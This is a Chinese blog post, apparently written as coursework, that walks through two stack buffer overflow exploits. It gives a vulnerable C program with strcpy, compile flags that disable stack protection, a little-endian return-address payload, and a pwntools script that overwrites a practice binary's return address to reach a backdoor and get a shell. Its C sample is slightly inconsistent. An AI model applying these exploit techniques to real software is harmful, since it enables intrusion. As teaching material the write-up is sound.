<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>栈溢出利用</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-EZRSNLSEWX"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());
    </script>
    <script type="module" crossorigin="" src="/assets/app.94739a9c.js"></script>
    <link rel="stylesheet" href="/assets/index.b28ab1fe.css">
  <link rel="modulepreload" crossorigin="" href="/assets/content.77935d12.js"><meta property="og:title" content="栈溢出利用"><meta name="head:count" content="1"></head>

  <body>
    <div id="app" data-server-rendered="true"><div class="w-full items-center justify-center m-0 p-0"><!--[--><header class="w-full fixed z-99" style="--37938739:url(&quot;/bg1.png&quot;);" data-v-35def80b=""><div class="header-navigation text--layout flex items-center justify-center" style="height:64px;background-color:transparent;" data-v-35def80b=""><div class="flex justify-between items-center w-3xl <md:w-full" data-v-35def80b=""><div data-v-35def80b=""><a href="/" class="text--link" data-v-35def80b="">ChenKS</a></div><div class="flex text-sm font-400 items-center" data-v-35def80b=""><!--[--><a href="/" class="text--link" data-v-35def80b="">首页</a><a href="/article-list" class="text--link" data-v-35def80b="">文章</a><a href="/about" class="text--link" data-v-35def80b="">关于</a><!--]--><button class="cursor-pointer text-white bg-transparent py-0.75 px-2.5 text-sm" data-v-35def80b=""><span class="inline-block align-middle dark:i-carbon-moon i-carbon-sun"></span></button></div></div></div></header><div class="flex flex-col" style="min-height:100vh;--37938739:url(&quot;/bg1.png&quot;);" data-v-35def80b=""><div class="w-full header-cover-bg min-h-lg" data-v-35def80b=""></div><div class="content-container-wrapper dark:bg-dark" data-v-35def80b=""><div class="content-container" data-v-35def80b=""><!--[--><div class="h-55 -mt-55 flex flex-col items-center text-white"><div class="font-bold text-3xl">栈溢出利用</div><div class="text-lg mt-2">2020-09-16</div><div class="mt-2 italic">#信息安全</div></div><!--[--><div class="markdown-body"><h1>概述</h1><p><img src="/assets/stack-frame.167992cb.jpg" alt="stack-frames"></p><p>软件漏洞分析课程的一次作业，利用了栈内存的缓冲区溢出，覆盖了返回地址，从而达到劫持控制流的目的。</p><h1>EXP1</h1><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">function2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Executed chagned\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">function1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">function1</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Executed normally\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>使用<code>gdb</code>进行调试，<code>strcpy</code>函数可以被利用引起缓冲区溢出，目前的问题时需要多长的字符串，以及需要将<code>function1</code>栈帧的返回地址覆盖为什么 环境</p><blockquote><p>ubuntu 16.04</p><p>gcc 5.4.0</p><p>gdb 7.11.1</p></blockquote><p><img src="/assets/ubuntu-arch.9e2c0d28.png" alt="arch"></p><p>关闭堆栈保护机制，使用<code>gcc</code>编译</p><pre class="language-bash"><code class="language-bash">gcc <span class="token parameter variable">-g</span> main.c <span class="token parameter variable">-m32</span> <span class="token parameter variable">-o</span> main32 <span class="token parameter variable">-z</span> execstack -fno-stack-protector
</code></pre><p><img src="/assets/gdb-debug.95275953.png" alt="gdb"></p><p>可以得出<code>ebp</code>与<code>&amp;buffer</code>相距 13 个字节，同时返回地址占用 4 个字节，<code>function2</code>的地址为<code>0x0804845B</code>。由于采用的是<code>小端存储</code>，因此需要将目标函数地址按字节倒序写入。构造出 payload<code>AAAAAAAAAAAAAAAAA\x5B\x84\x04\x08</code></p><p><img src="/assets/stack-overlow-result.7c227cf6.png" alt="stack-overflow-result"></p><p>成功调用了<code>function2</code>，同理地址也可以被改成其他的函数地址。</p><h1>EXP2</h1><p>已知一个<a href="https://raw.github.com/ChenKS12138/ChenKS12138.github.io/source-code/assets/stack-tutorial">二进制文件</a>，通过 ida 静态调试。</p><p><img src="/assets/stack-overflow-ida.058cd66e.png" alt="ida"></p><p>vulnerable_function 中的 buffer 只需要 1 个字节，但是第五行的 read 函数可以输入 256 个字节，这里可能存在着栈溢出。根据第三行的注释推测，<code>&amp;buffer</code>距离<code>ebp</code>位 0x30 个字节，猜测我们需要构造的 payload 为 52 字节的字符串再加上目标函数的地址，即<code>backdoor</code>函数的地址。</p><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ret_addr<span class="token operator">=</span><span class="token number">0x0804846B</span>

payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">52</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><p><img src="/assets/stack-overflow-pwn-result.f8168e05.png" alt="EXP2-RESULT"></p><p>成功拿到 shell</p></div><!--]--><!----><!--]--></div></div></div><!--]--></div></div>
    
  

</body></html>